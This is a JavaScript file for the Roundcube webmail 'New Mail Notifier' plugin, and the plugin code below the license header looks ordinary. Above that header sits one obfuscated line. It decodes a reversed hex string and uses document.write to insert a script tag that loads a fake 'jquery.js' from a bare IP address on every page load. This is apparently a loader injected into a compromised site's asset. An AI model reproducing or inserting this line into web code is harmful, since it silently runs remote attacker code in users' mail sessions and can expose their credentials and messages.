var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
/**
 * New Mail Notifier plugin script
 *
 * @author Aleksander Machniak <alec@alec.pl>
 *
 * @licstart  The following is the entire license notice for the
 * JavaScript code in this file.
 *
 * Copyright (c) 2013-2016, The Roundcube Dev Team
 *
 * The JavaScript code in this page is free software: you can redistribute it
 * and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * @licend  The above is the entire license notice
 * for the JavaScript code in this file.
 */

if (window.rcmail && rcmail.env.task == 'mail') {
    rcmail.addEventListener('plugin.newmail_notifier', newmail_notifier_run)
        .addEventListener('actionbefore', newmail_notifier_stop)
        .addEventListener('init', function() {
            // bind to messages list select event, so favicon will be reverted on message preview too
            if (rcmail.message_list)
                rcmail.message_list.addEventListener('select', newmail_notifier_stop);
        });
}

// Executes notification methods
function newmail_notifier_run(prop)
{
    if (prop.basic)
        newmail_notifier_basic();
    if (prop.sound)
        newmail_notifier_sound();
    if (prop.desktop)
        newmail_notifier_desktop(rcmail.get_label('body', 'newmail_notifier'));
}

// Stops notification
function newmail_notifier_stop(prop)
{
    // revert original favicon
    if (rcmail.env.favicon_href && rcmail.env.favicon_changed && (!prop || prop.action != 'check-recent')) {
        $('<link rel="shortcut icon" href="'+rcmail.env.favicon_href+'"/>').replaceAll('link[rel="shortcut icon"]');
        rcmail.env.favicon_changed = 0;
    }

    // Remove IE icon overlay if we're pinned to Taskbar
    try {
        if(window.external.msIsSiteMode()) {
            window.external.msSiteModeClearIconOverlay();
        }
    } catch(e) {}
}

// Basic notification: window.focus and favicon change
function newmail_notifier_basic()
{
    var w = rcmail.is_framed() ? window.parent : window,
        path = rcmail.assets_path('plugins/newmail_notifier');

    w.focus();

    // we cannot simply change a href attribute, we must to replace the link element (at least in FF)
    var link = $('<link rel="shortcut icon">').attr('href', path + '/favicon.ico'),
        oldlink = $('link[rel="shortcut icon"]', w.document);

    if (!rcmail.env.favicon_href)
        rcmail.env.favicon_href = oldlink.attr('href');

    rcmail.env.favicon_changed = 1;
    link.replaceAll(oldlink);

    // Add IE icon overlay if we're pinned to Taskbar
    try {
        if (window.external.msIsSiteMode()) {
            window.external.msSiteModeSetIconOverlay(path + '/overlay.ico', rcmail.get_label('title', 'newmail_notifier'));
        }
    } catch(e) {}
}

// Sound notification
function newmail_notifier_sound()
{
    var elem, src = rcmail.assets_path('plugins/newmail_notifier/sound'),
        plugin = navigator.mimeTypes ? navigator.mimeTypes['audio/mp3'] : {};

    // Internet Explorer does not support wav files,
    // support in other browsers depends on enabled plugins,
    // so we use wav as a fallback
    src += bw.ie || (plugin && plugin.enabledPlugin) ? '.mp3' : '.wav';

    // HTML5
    try {
        elem = $('<audio>').attr('src', src);
        elem.get(0).play();
    }
    // old method
    catch (e) {
        elem = $('<embed id="sound" src="' + src + '" hidden=true autostart=true loop=false />');
        elem.appendTo($('body'));
        window.setTimeout("$('#sound').remove()", 5000);
    }
}

// Desktop notification
// - Require window.Notification API support (Chrome 22+ or Firefox 22+)
function newmail_notifier_desktop(body, disabled_callback)
{
    var timeout = rcmail.env.newmail_notifier_timeout || 10,
        icon = rcmail.assets_path('plugins/newmail_notifier/mail.png'),
        success_callback = function() {
            var popup = new window.Notification(rcmail.get_label('title', 'newmail_notifier'), {
                dir: "auto",
                lang: "",
                body: body,
                tag: "newmail_notifier",
                icon: icon
            });
            popup.onclick = function() { this.close(); };
            setTimeout(function() { popup.close(); }, timeout * 1000);
        };

    try {
        window.Notification.requestPermission(function(perm) {
            if (perm == 'granted')
                success_callback();
            else if (perm == 'denied' && disabled_callback)
                disabled_callback();
        });

        return true;
    }
    catch (e) {
        return false;
    }
}

function newmail_notifier_test_desktop()
{
    var status = newmail_notifier_desktop(rcmail.get_label('testbody', 'newmail_notifier'), function() {
        rcmail.display_message(rcmail.get_label('desktopdisabled', 'newmail_notifier'), 'error');
    });

    if (!status) {
        rcmail.display_message(rcmail.get_label('desktopunsupported', 'newmail_notifier'), 'error');
    }
}

function newmail_notifier_test_basic()
{
    newmail_notifier_basic();
}

function newmail_notifier_test_sound()
{
    newmail_notifier_sound();
}
